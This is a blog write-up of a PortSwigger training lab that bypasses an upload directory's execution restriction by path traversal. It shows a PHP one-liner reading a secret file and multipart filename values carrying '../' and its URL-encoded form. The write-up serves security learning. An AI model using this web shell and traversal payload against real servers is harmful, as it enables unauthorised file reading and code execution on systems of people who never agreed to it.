---
layout: post
title: "Lab: Web shell upload via path traversal [Write-up]"
date: 2026-08-01
platform: portswigger
vulntype: file_uploads_vuln
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** Web shell upload via path traversal

**Platform:** PortSwigger

**Difficulty:** Medium

---

## Description

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

**Step 1**

Let's log in to our wiener account

<p align="center">
  <img src="/assets/css/img/File upload vulnerabilities/file_uplod1.png" alt="file_uploads_vuln" />
</p>

**Step 2**

If we upload our PHP file with the shell, we'll succeed, but if we then try to execute it using path traversal, we won't be able to—all we'll get is the file's contents. 

```python
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

<p align="center">
  <img src="/assets/css/img/File upload vulnerabilities/file_uplod13.png" alt="file_uploads_vuln" />
</p>

It's possible that the `/files/avatars` directory isn't configured to execute files, so let's try uploading our file to the files directory,

**Step 3**

To upload a file to the “files” directory, we'll use path traversal 

```python
../
```

Let's resubmit the request to upload the file 

```python
Content-Disposition: form-data; name="avatar"; filename="../shell2.php"
```

If we change the `filename` parameter to `../shell.php`, we won't be able to carry out the attack, so let's encode `../` in the URL

```python
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fshell2.php"
```

<p align="center">
  <img src="/assets/css/img/File upload vulnerabilities/file_uplod14.png" alt="file_uploads_vuln" />
</p>

<p align="center">
  <img src="/assets/css/img/File upload vulnerabilities/file_uplod15.png" alt="file_uploads_vuln" />
</p>

We were able to upload our file; let's now navigate to that file in the “files” directory.

<p align="center">
  <img src="/assets/css/img/File upload vulnerabilities/file_uplod16.png" alt="file_uploads_vuln" />
</p>

<p align="center">
  <img src="/assets/css/img/File upload vulnerabilities/file_uplod17.png" alt="file_uploads_vuln" />
</p>

We'll get our code in the response 

---
<div align="center">

This post is licensed under  
<a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>.

© 2026 CyberKRY

</div>
